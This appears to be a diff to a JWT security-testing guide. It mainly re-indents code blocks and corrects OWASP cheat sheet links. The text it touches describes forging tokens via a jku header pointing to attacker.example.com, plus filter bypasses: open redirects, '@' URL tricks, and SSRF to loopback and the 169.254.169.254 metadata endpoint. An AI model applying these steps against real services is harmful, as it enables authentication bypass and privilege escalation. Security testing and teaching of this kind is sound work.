@@ -247,38 +247,38 @@ If the verification library automatically fetches public keys from the URI speci
 1. Generate an RSA keypair on a testing machine.
 2. Host the corresponding public key formatted as a JSON Web Key Set (JWKS) on a public server:
 
-```json
-{
-  "keys": [
+    ```json
     {
-      "kty": "RSA",
-      "e": "AQAB",
-      "use": "sig",
-      "kid": "test-key-01",
-      "alg": "RS256",
-      "n": "u1SucjA342W..."
+      "keys": [
+        {
+          "kty": "RSA",
+          "e": "AQAB",
+          "use": "sig",
+          "kid": "test-key-01",
+          "alg": "RS256",
+          "n": "u1SucjA342W..."
+        }
+      ]
     }
-  ]
-}
-```
+    ```
 
 3. Modify the target JWT payload with altered claims (e.g., modifying `user_id` or `role`).
 4. Update the JWT header with the `jku` parameter pointing to the hosted JWKS endpoint and matching `kid`:
 
-```json
-{
-  "alg": "RS256",
-  "typ": "JWT",
-  "jku": "https://attacker.example.com/.well-known/jwks.json",
-  "kid": "test-key-01"
-}
-```
+    ```json
+    {
+      "alg": "RS256",
+      "typ": "JWT",
+      "jku": "https://attacker.example.com/.well-known/jwks.json",
+      "kid": "test-key-01"
+    }
+    ```
 
 5. Sign the forged token using the private key and submit it in an authenticated request.
 6. If direct external hostnames are blocked, evaluate URL filtering bypasses:
-   - Check for open redirect vulnerabilities on allowed domains (e.g., `https://trusted.example.com/oauth/redirect?url=https://attacker.example.com/jwks.json`).
-   - Check for URL parser discrepancies or path normalization flaws (e.g., `https://trusted.example.com@attacker.example.com/jwks.json`).
-   - Check if the server attempts internal network resolution (SSRF) when pointing `jku` to loopback (`http://127.0.0.1/`) or cloud metadata endpoints (`http://169.254.169.254/`).
+    - Check for open redirect vulnerabilities on allowed domains (e.g., `https://trusted.example.com/oauth/redirect?url=https://attacker.example.com/jwks.json`).
+    - Check for URL parser discrepancies or path normalization flaws (e.g., `https://trusted.example.com@attacker.example.com/jwks.json`).
+    - Check if the server attempts internal network resolution (SSRF) when pointing `jku` to loopback (`http://127.0.0.1/`) or cloud metadata endpoints (`http://169.254.169.254/`).
 
 ### Token Audience (aud) and Issuer (iss) Confusion
 
@@ -313,7 +313,7 @@ If Service B trusts the IdP signature but omits `aud` validation, an attacker wi
 - Use a strong HMAC key or a unique private key to sign tokens.
 - Ensure that there is no sensitive information exposed in the payload.
 - Ensure that JWTs are securely stored and transmitted.
-- See the [OWASP JSON Web Tokens Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html).
+- See the [OWASP JSON Web Tokens Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html).
 
 ## Tools
 
@@ -329,4 +329,4 @@ If Service B trusts the IdP signature but omits `aud` validation, an attacker wi
 - [RFC 7515 JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)
 - [RFC 7519 JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
 - [RFC 8725 JSON Web Token Best Current Practices](https://tools.ietf.org/html/rfc8725)
-- [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
+- [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html)
